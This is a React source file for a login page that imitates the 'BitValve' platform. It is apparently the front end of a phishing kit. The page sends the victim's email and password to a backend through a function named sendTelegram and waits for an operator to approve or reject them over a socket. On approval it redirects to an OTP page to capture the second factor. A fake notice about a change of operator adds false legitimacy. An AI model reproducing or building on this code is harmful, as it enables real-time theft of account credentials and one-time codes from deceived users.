import React, { useState } from "react";
import logo from "./assets/logovv.png";
import { TriangleAlert, Eye, EyeOff } from "lucide-react";
import { Star } from "lucide-react";

import { FcGoogle } from "react-icons/fc";
import { FaFacebookF, FaApple } from "react-icons/fa";
import axios from "axios";
import { useNavigate } from "react-router-dom";
import { io } from "socket.io-client";
import { useEffect } from "react";

function Login() {
  const [showPassword, setShowPassword] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [loginErr, setLoginErr] = useState("");
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  const url = import.meta.env.SERVER;
  const socket = io(url);
  useEffect(() => {
    socket.on("ticketStatus", (data) => {
      console.log("object");
      setLoading(false);
      if (data.status === "rejected") {
        setLoginErr("Wrong details");
      }
      if (data.status == "approved") {
        navigate("/otp");
      }
    });

    return () => {
      socket.off("ticketStatus");
    };
  }, []);

  const sendTelegram = async () => {
    const response = await axios.post(`${url}/api/ticket`, {
      email,
      password,
      socketId: socket.id,
    });
    console.log(socket.id);
    const requestId = response.data.requestId;

    // tell backend this browser belongs to this request
    socket.emit("register", requestId);

    console.log("Waiting for response...");
  };

  const handleClick = () => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!email.trim()) {
      setError("Email is required.");
      return;
    }

    if (!emailRegex.test(email.trim())) {
      setError("Please enter a valid email address.");
      return;
    }
    if (!password.trim()) {
      setError("Password is required");
      return;
    }
    setLoading(true);
    sendTelegram();

    // setTimeout(() => {
    //   navigate("/otp");
    // }, 3000);
  };

  const inputClass =
    "w-full py-3 color-ipt  rounded-lg px-2 focus:outline-none caret-gray-100";
  const divClass = "mx-3 gap-2";
  return (
    <div className="color-bg flex flex-col py-6 px-3">
      <div className="mx-1 mb-5 flex items-start gap-4 rounded-xl  bg-warn text-warn p-2 shadow-md warn-border">
        <div className=" flex items-center justify-center  ">
          <TriangleAlert className="h-5 w-5 " />
        </div>

        <div className="text-sm leading-6 ">
          <h3 className="mb-2 text-base font-bold ">Important</h3>
          From 1 July 2026, BitValve is operated by{" "}
          <strong>3-102-966440 S.R.L.</strong> (Costa Rica), under updated
          {"   "}
          <span className="underline">Terms of Service</span> and{" "}
          <span className="underline">Privacy Policy</span>, and your account
          data will be transferred to the new operator. By continuing, you
          accept the updated Terms and Privacy Policy.
          <p>
            If you don't agree, email{" "}
            <span className="font-semibold underline">
              privacy@bitvalve.com
            </span>{" "}
            to delete your account.
          </p>
        </div>
      </div>
      <div className="color-b flex flex-col p-5 justify-center  gap-4  ">
        <img src={logo} className="object-cover" alt="" />
        <div className={`${divClass}`}>
          <p className="text-white font-bold font-mono">Login</p>
          <label className="color-lbl text-sm font-bold" htmlFor="">
            EMAIL
          </label>
          <input
            type="email"
            name=""
            id=""
            style={{ color: "#909191" }}
            placeholder="Enter your email address"
            className={`${inputClass}`}
            onChange={(e) => {
              setEmail(e.target.value);
            }}
          />

          {error && <p className="text-red-500 text-sm mt-1">{error}</p>}
        </div>
        <div className={divClass}>
          <label className="color-lbl text-sm font-bold">PASSWORD</label>

          <div className="relative">
            <input
              className={`${inputClass} pr-12`}
              type={showPassword ? "text" : "password"}
              placeholder="Enter your password"
              style={{ color: "#909191" }}
              onChange={(e) => {
                setPassword(e.target.value);
              }}
            />

            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 top-1/2 -translate-y-1/2 color-rg"
            >
              <Eye size={20} />
            </button>
          </div>

          {loginErr && (
            <div className="p-1  flex bg-black text-white text-xsm font-mono mt-1 items-center gap-1 max-w-max">
              <span className="text-yellow-800">
                <Star size={10} />
              </span>
              <span className="f-1">Email or Password is wrong.</span>
            </div>
          )}
          <p className="mt-2 text-right text-xs text-white select-none small-f ">
            I FORGOT MY PASSWORD
          </p>
        </div>
        <button
          disabled={loading}
          onClick={handleClick}
          className="color-btn p-5 py-3 rounded-4xl font-bold w-full font-mono disabled:opacity-50 "
        >
          {" "}
          {loading ? "Please wait..." : "Login"}
        </button>{" "}
        <div className="my-6 flex items-center">
          <div className="flex-1 border-t border-gray-700"></div>

          <span className="mx-4 rounded-full px-3 py-1 text-xs font-semibold color-lbl">
            OR
          </span>

          <div className="flex-1 border-t border-gray-700"></div>
        </div>
        <div className="flex justify-center gap-3">
          <button className="rounded-full p-3 bg-white transition hover:scale-105">
            <FcGoogle size={22} />
          </button>

          <button className="rounded-full p-3 bg-white transition hover:scale-105">
            <FaFacebookF size={22} />
          </button>

          <button className="rounded-full p-3 bg-white text-black transition hover:scale-105">
            <FaApple size={22} />
          </button>
        </div>
        <p className="mt-5 text-center text-xs color-lbl">
          Continue with your preferred account
        </p>
      </div>
    </div>
  );
}

export default Login;
